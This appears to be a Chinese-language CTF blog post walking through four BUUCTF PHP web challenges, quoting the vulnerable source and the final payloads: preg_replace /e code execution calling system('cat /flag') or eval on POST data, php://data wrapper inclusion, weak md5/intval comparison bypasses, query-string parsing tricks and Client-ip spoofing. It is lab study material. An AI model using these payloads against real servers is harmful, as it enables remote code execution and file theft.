---
title: BUUCTF_php
date: 2022-02-08 21:59:33
updated: 2022-02-08 21:59:33
tags: [php]
categories: BUUCTF
toc: true
---
BUUCTF中和PHP有关的题目
<!-- more -->

## 一、[BJDCTF2020]ZJCTF，不过如此

### 知识点：php伪协议、preg_replace与代码执行

```php
<?php
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }
    include($file);  //next.php
}?>
```

首先要绕过$text的文本判断，可以用php://input或者`data:text/plain,I have a dream` (实测后者有效，不明所以)

接着用base64过滤器读取next.php的源码，如下：

```php+HTML
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;
function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}
foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}
function getFlag(){
	@eval($_GET['cmd']);
}
```

这里涉及到preg_replace与代码执行:https://xz.aliyun.com/t/2557

```
/?.*=${执行的命令}
preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str);
原先的语句,
preg_replace('/(.*)/ei','strtolower("\\1")',${执行的命令});
之后的语句
或者构造语句
preg_replace('/(\S*)/ei','strtolower("\\1")',${执行的命令});
表达式 .* 就是单个字符匹配任意，即贪婪匹配。 表达式 .*? 是满足条件的情况只匹配一次，即最小匹配.
\s    匹配任何空白非打印字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。注意 Unicode 正则表达式会匹配全角空格符。 
\S    匹配任何非空白非打印字符。等价于 [^ \f\n\r\t\v]。
```

构造payload:`?\S*=${getFlag()}&cmd=system('cat /flag');`或者`?\S*=${eval($_POST[1])}`

## 二、[ASIS 2019]Unicorn shop

### 知识点：unicode字符，UTF-8转码问题

经过几次尝试后，发现要购买第四项商品，但参数price只能接受单个字符。

让price传空，发现了如下报错：

```
Traceback (most recent call last):
  File "/usr/local/lib/python2.7/site-packages/tornado/web.py", line 1541, in _execute
    result = method(*self.path_args, **self.path_kwargs)
  File "/app/sshop/views/Shop.py", line 34, in post
    unicodedata.numeric(price)
TypeError: need a single Unicode character as parameter
```

![](https://s2.loli.net/2022/02/14/tJXB1IyGEvM2udo.png)

进入这个网址查找比1337大的unicode单字符即可(搜索thousand)，https://www.compart.com/en/unicode/

并将utf-8 encoding那项的0x改为%即可。

最终payload:`POST:id=4&price=%E2%86%87`

## 三、[WUSTCTF2020]朴实无华

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);
//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>
```

### 1.intval()绕过

经测试以下只适合php7.0及以下版本，此题同理

```
echo intval('5e2'); //5
echo intval('5e2'+1); //501
```

### 2.MD5绕过

md5(xxx)==xxx

```
0e215962017
md5值：0e291242476940776845150308577824
```

两种特殊的md5，可绕过弱比较



## 四、[MRCTF2020]套娃

### 知识点：php字符串解析特性bypass(传参)+伪协议

参考：https://www.freebuf.com/articles/web/213359.html

查看源代码发现：

```php
$query = $_SERVER['QUERY_STRING'];
if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```

$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。

要求传到服务器的信息中不能含有`_`和`%5f`，但是传参的名称是有下划线的，可以同过%20进行绕过，具体详情看参考链接

PHP会将`b%20u%20p%20t`--->`b u p t`--->`b_u_p_t`

传递的参数不能为23333，但又要以23333开头和结尾，可以在尾部补上换行%0a，%0a代表结尾

```php
?b%20u%20p%20t=23333%0a
```

得到下一步：FLAG is in secrettw.php

![image-20220421144239827](https://s2.loli.net/2022/04/21/mVpJwXj8vWfkB5A.png)

这是jsfuck编码(非常神奇)，在控制台运行后发现hint，随便post一个数据

```php
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';
if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 
function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
```

得到源码，突破点：

1.伪造ip：Client-ip:127.0.0.1

2.file_get_contents ---> data伪协议文件流

3.反写change函数，得到 ZmpdYSZmXGI= ---> flag.php

最终payload:`?file=ZmpdYSZmXGI=&2333=data:text/plain,todat is a happy day`，添加伪造ip的头信息即可
